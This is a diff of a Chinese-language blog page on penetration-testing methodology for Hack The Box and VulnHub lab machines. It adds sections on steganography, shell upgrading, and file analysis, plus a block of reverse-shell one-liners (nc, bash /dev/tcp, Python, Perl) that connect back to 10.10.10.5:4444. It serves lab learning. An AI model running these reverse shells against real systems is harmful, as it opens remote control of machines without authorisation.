@@ -54,7 +54,7 @@ Hack The Box 靶机 Busqueda 访问 80 端口暴露出使用的为开源系统 S
 VulnHub 的靶机 LazySysAdmin 开启了 smb 服务，通过连接共享文件夹获取 mysql 和 phpmyadmin 的账号密码，通过暴力破解密码，ssh 获得初始立足点，随后提权。 已知 CVE 利用 版本识别 → CVE查询 → POC利用 → 过的初始立足点 → 基础 例如：">
   <meta itemprop="datePublished" content="2025-12-27T17:29:33+08:00">
   <meta itemprop="dateModified" content="2025-12-27T17:29:33+08:00">
-  <meta itemprop="wordCount" content="141">
+  <meta itemprop="wordCount" content="240">
   <meta itemprop="keywords" content="Hack,技术">
 
   <meta name="twitter:card" content="summary">
@@ -137,7 +137,7 @@ VulnHub 的靶机 LazySysAdmin 开启了 smb 服务，通过连接共享文件�
           <circle cx="12" cy="12" r="10"></circle>
           <polyline points="12 6 12 12 16 14"></polyline>
         </svg>
-        One minute
+        2 minutes
 
         
       </p>
@@ -156,17 +156,21 @@ VulnHub 的靶机 LazySysAdmin 开启了 smb 服务，通过连接共享文件�
           <div class="toc-title">Table of Contents</div>
           <nav id="TableOfContents">
   <ul>
-    <li><a href="#攻击链复杂度分层">攻击链复杂度分层</a>
+    <li><a href="#靶机分类">靶机分类</a>
       <ul>
-        <li><a href="#easy-类型">Easy 类型</a></li>
-        <li><a href="#medium-类型">Medium 类型</a></li>
-        <li><a href="#hard-类型">Hard 类型</a></li>
+        <li><a href="#攻击链复杂度分层">攻击链复杂度分层</a></li>
       </ul>
     </li>
-  </ul>
-
-  <ul>
-    <li><a href="#开放的非常规端口">开放的非常规端口</a></li>
+    <li><a href="#遇见的情况以及方法论">遇见的情况以及方法论</a>
+      <ul>
+        <li><a href="#开放的非常规端口">开放的非常规端口</a></li>
+        <li><a href="#图片分析">图片分析</a></li>
+        <li><a href="#bash-逃逸">Bash 逃逸</a></li>
+        <li><a href="#获得-shell-的一些-反弹-shell">获得 shell 的一些 反弹 shell</a></li>
+        <li><a href="#文件属性和可识别字符">文件属性和可识别字符</a></li>
+        <li><a href="#将文件从-ssh-中拿出">将文件从 ssh 中拿出</a></li>
+      </ul>
+    </li>
   </ul>
 </nav>
         </aside>
@@ -177,11 +181,11 @@ VulnHub 的靶机 LazySysAdmin 开启了 smb 服务，通过连接共享文件�
       <div class="post-content">
         <blockquote>
 <p>本文章以笔者写过的 80 台靶机为样本做渗透测试方法论分析</p></blockquote>
-<h1 id="靶机分类">靶机分类</h1>
-<h2 id="攻击链复杂度分层">攻击链复杂度分层</h2>
-<h3 id="easy-类型">Easy 类型</h3>
+<h2 id="靶机分类">靶机分类</h2>
+<h3 id="攻击链复杂度分层">攻击链复杂度分层</h3>
+<h4 id="easy-类型">Easy 类型</h4>
 <p>这类靶机没有复杂的攻击链，一般进行 信息收集、单漏洞利用 就可以拿到一个初始的立足点，然后进行简单的提权操作即可获得 root 权限。</p>
-<h4 id="web-漏洞链路">Web 漏洞链路</h4>
+<h5 id="web-漏洞链路">Web 漏洞链路</h5>
 <pre tabindex="0"><code>信息收集 → 目录爆破 → Web漏洞（SQL注入/命令注入/文件上传 等）→ 获得初始立足点 → 本地提权（SUID/Sudo/Cron/内核漏洞 等）
 </code></pre><p>例如：</p>
 <ul>
@@ -190,24 +194,24 @@ VulnHub 的靶机 LazySysAdmin 开启了 smb 服务，通过连接共享文件�
 <p><img src="%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="漏洞搜索示意图"></p>
 <p><img src="AI%E9%A9%B1%E5%8A%A8%E6%90%9C%E7%B4%A2.png" alt="AI驱动搜索"></p>
 <p>在 kali 本地监听获得初始立足点后进行手工枚举（sudo -l ; whoami ;ip a 等），随后根据具体的情况进行进一步提权</p>
-<h4 id="凭证泄露">凭证泄露</h4>
+<h5 id="凭证泄露">凭证泄露</h5>
 <pre tabindex="0"><code>服务枚举（SMB/FTP/NFS）→ 匿名访问/弱密码 → 凭证发现 → SSH/WinRM登录 → 提权
 </code></pre><p>例如：</p>
 <ul>
 <li>VulnHub 的靶机 LazySysAdmin 开启了 smb 服务，通过连接共享文件夹获取 mysql  和 phpmyadmin 的账号密码，通过暴力破解密码，ssh 获得初始立足点，随后提权。</li>
 </ul>
-<h4 id="已知-cve-利用">已知 CVE 利用</h4>
+<h5 id="已知-cve-利用">已知 CVE 利用</h5>
 <pre tabindex="0"><code>版本识别 → CVE查询 → POC利用 → 过的初始立足点 → 基础
 </code></pre><p>例如：</p>
 <ul>
 <li>Hack The Box 的靶机  Broker，通过利用 ActiveMQ 的 CVE payload 获得初始立足点</li>
 </ul>
-<h3 id="medium-类型">Medium 类型</h3>
+<h4 id="medium-类型">Medium 类型</h4>
 <p>这类靶机相对 Easy 类型靶机攻击难度略微复杂 。</p>
-<h3 id="hard-类型">Hard 类型</h3>
+<h4 id="hard-类型">Hard 类型</h4>
 <p>这类靶机通常需要多个攻击链利用，渗透难度较大。</p>
-<h1 id="遇见的情况以及方法论">遇见的情况以及方法论</h1>
-<h2 id="开放的非常规端口">开放的非常规端口</h2>
+<h2 id="遇见的情况以及方法论">遇见的情况以及方法论</h2>
+<h3 id="开放的非常规端口">开放的非常规端口</h3>
 <p>遇见非常规端口一般使用 nc 尝试进行交互，例如 DeathStar 靶机，开放了 UDP 1440 端口，尝试使用 nc 进行交互获得回显。</p>
 <pre tabindex="0"><code>┌──(kali㉿kali)-[~/Work/Kali]
 └─$ nc -u 10.10.10.45 1440
@@ -219,6 +223,34 @@ We&#39;ll notify Commander Tarkin of this offense
 <pre tabindex="0"><code>┌──(kali㉿kali)-[~/Work/Kali]
 └─$ echo &#34;DS-1@OBS&#34; | nc -u 10.10.10.45 1440
 ......
+</code></pre><h3 id="图片分析">图片分析</h3>
+<p>图片分析一般先查看隐写情况。</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/Work/Kali]
+└─$ steghide extract -sf x.jpg
+Enter passphrase:
+</code></pre><p>解释一下这个命令，extract 为提取模式，提取图片中隐藏的内容，-sf 为 &ndash;stegofile 的缩写，指定文件为 x.jpg。需要密码的话想到的、空密码、弱密码均值得尝试。</p>
+<h3 id="bash-逃逸">Bash 逃逸</h3>
+<p>在获得初始立足点后常常 bash 的交互性并不完善，通常使用 python 的 pty 库获得一个假的、交互性相对好的 bash。</p>
+<pre tabindex="0"><code>python3 -c &#34;import pty;pty.spawn(&#39;/bin/bash&#39;);&#34;
+</code></pre><h3 id="获得-shell-的一些-反弹-shell">获得 shell 的一些 反弹 shell</h3>
+<h4 id="linux">Linux</h4>
+<pre tabindex="0"><code>nc -e /bin/bash 10.10.10.5 4444
+
+bash -c &#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.10.5/4444 0&gt;&amp;1&#34;
+
+python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.10.5&#34;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;]);&#39;
+
+perl -e &#39;use Socket;$i=&#34;10.10.10.5&#34;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;
+</code></pre><h3 id="文件属性和可识别字符">文件属性和可识别字符</h3>
+<p>在拿到一个文件后可进行如下分析：</p>
+<p><img src="P1.png" alt="P1"></p>
+<p>file 命令是识别文件类型和格式，通过分析文件头信息等数据来判断文件实际的内容与格式，从输出结果来看， /bin/dartvader 是一个 32 位的 ELF 可执行文件，并设置了 setuid 位，这意味着无论哪个用户执行这个程序，它都会以文件所有者的权限进行，动态链接表明该程序在运行时需要调用共享库，而 <code>not stripped</code> 则说明这个可执行文件中仍保留有符号信息与调试信息，这对逆向工程非常有利。在渗透测试场景下，如果测试者发现这样一个 setuid 程序，可以重点关注它是否存在提权漏洞，比如通过错误的权限验证、缓冲区溢出或者不安全的函数调用来实现提权。此外，未剥离的符号信息可能让分析人员更容易理解程序的内部逻辑，从而寻找可能的漏洞或不当行为，这对进一步的利用或者漏洞利用代码的编写往往有利，可以看一下可识别字符佐证发现。</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/Work/Kali]
+└─$ strings /bin/dartVader
+</code></pre><h3 id="将文件从-ssh-中拿出">将文件从 ssh 中拿出</h3>
+<p>以下面这个命令为例，将 ssh 用户 erso 的 /bin/dartVader 文件下载到当前目录，指定 ssh 端口位 10110。</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/Work/Kali]
+└─$ scp -P 10110 -q erso@10.110.10.45:/bin/dartVader .
 </code></pre><blockquote>
 <p>本文章持续更新中</p></blockquote>
 
@@ -247,7 +279,7 @@ We&#39;ll notify Commander Tarkin of this offense
           <line x1="16" y1="17" x2="8" y2="17"></line>
           <polyline points="10 9 9 9 8 9"></polyline>
         </svg>
-        141 Words
+        240 Words
       </p>
 
       <p>
